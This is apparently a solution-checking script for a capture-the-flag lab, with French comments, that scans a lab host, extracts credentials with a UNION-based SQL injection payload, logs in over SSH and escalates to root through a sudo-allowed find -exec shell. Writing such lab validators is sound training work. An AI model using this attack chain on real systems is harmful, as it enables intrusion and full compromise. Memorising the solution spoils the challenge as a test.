"""SPOILERS. Exécuté dans attacker ; aucune lecture des secrets via Docker exec.

Le test entre par HTTP, récupère les identifiants par SQLi puis passe par SSH.
Il n'affiche ni mot de passe ni valeur des flags.
"""
import os
import re
import shlex
import subprocess
import tempfile
import xml.etree.ElementTree as ET
from html.parser import HTMLParser
from urllib.parse import urlencode
from urllib.request import urlopen


class Text(HTMLParser):
    def __init__(self):
        super().__init__()
        self.parts = []

    def handle_data(self, data):
        self.parts.append(data)


def require(condition, message):
    if not condition:
        raise RuntimeError(message)


def main():
    scan = subprocess.run([
        'nmap', '-sT', '-Pn', '-n', '-sV', '-p-', '--open', '-oX', '-', 'legacy-telecom.hns',
    ], capture_output=True, text=True, timeout=120, check=True)
    ports = ET.fromstring(scan.stdout).findall('.//port')
    opened = {int(port.attrib['portid']): port for port in ports if port.find('state').attrib['state'] == 'open'}
    require(set(opened) == {22, 80}, 'Seuls les ports 22 et 80 doivent être accessibles.')
    require(opened[22].find('service').attrib.get('name') == 'ssh', 'SSH non reconnu sur le port 22.')
    require('nginx' in opened[80].find('service').attrib.get('product', '').lower(), 'Nginx non reconnu sur le port 80.')
    print('OK — scan TCP complet : SSH sur 22, Nginx sur 80, aucun autre port ouvert.')
    payload = '-1 UNION SELECT id,username,password,role FROM employees -- '
    with urlopen('http://legacy-telecom.hns/legacy/offer?' + urlencode({'id': payload}), timeout=5) as response:
        parser = Text()
        parser.feed(response.read().decode())
    text = '\n'.join(parser.parts)
    match = re.search(r'\bLT-[a-f0-9]{16}\b', text)
    require(match is not None and 'support' in text, 'Extraction SQLi impossible.')
    password = match.group()
    print('OK — identifiants récupérés par injection SQL.')
    with tempfile.TemporaryDirectory() as temp:
        environment = dict(os.environ, SSHPASS=password)

        def ssh(command):
            result = subprocess.run([
                'sshpass', '-e', 'ssh', '-T',
                '-o', 'StrictHostKeyChecking=accept-new',
                '-o', f'UserKnownHostsFile={temp}/known_hosts',
                '-o', 'ConnectTimeout=5', '-o', 'NumberOfPasswordPrompts=1',
                'support@legacy-telecom.hns', command,
            ], capture_output=True, text=True, env=environment, timeout=15)
            require(result.returncode == 0, 'Échec SSH ou commande distante : ' + result.stderr.strip())
            return result.stdout.strip()

        require(ssh('id -un') == 'support', 'Le compte initial doit être support.')
        require(ssh('id -u') != '0', 'Le compte initial ne doit pas être root.')
        user_flag = ssh('cat /home/support/user.txt')
        require(re.fullmatch(r'flag\{[a-f0-9]{32}\}', user_flag) is not None, 'Flag utilisateur invalide.')
        require(ssh('if cat /root/root.txt >/dev/null 2>&1; then echo LEAK; else echo DENIED; fi') == 'DENIED', 'Root est accessible sans élévation.')
        require(ssh('if cat /var/lib/legacy-state/state.json >/dev/null 2>&1; then echo LEAK; else echo DENIED; fi') == 'DENIED', 'Les secrets opérateur sont accessibles.')
        print('OK — connexion utilisateur, flag user et permissions initiales.')
        require('/usr/bin/find' in ssh('sudo -n -l'), 'Permission sudo attendue absente.')
        root_command = 'id -u; cat /root/root.txt'
        output = ssh("sudo -n /usr/bin/find /srv/archive -maxdepth 0 -exec /bin/sh -c " + shlex.quote(root_command) + " \\;").splitlines()
        require(len(output) == 2 and output[0] == '0', 'Élévation de privilèges impossible.')
        require(re.fullmatch(r'flag\{[a-f0-9]{32}\}', output[1]) is not None, 'Flag root invalide.')
        require(output[1] != user_flag, 'Les deux flags doivent être distincts.')
        print('OK — élévation sudo, UID 0 et flag root distinct.')
    print('Parcours complet validé, aucune valeur de flag affichée.')


if __name__ == '__main__':
    main()
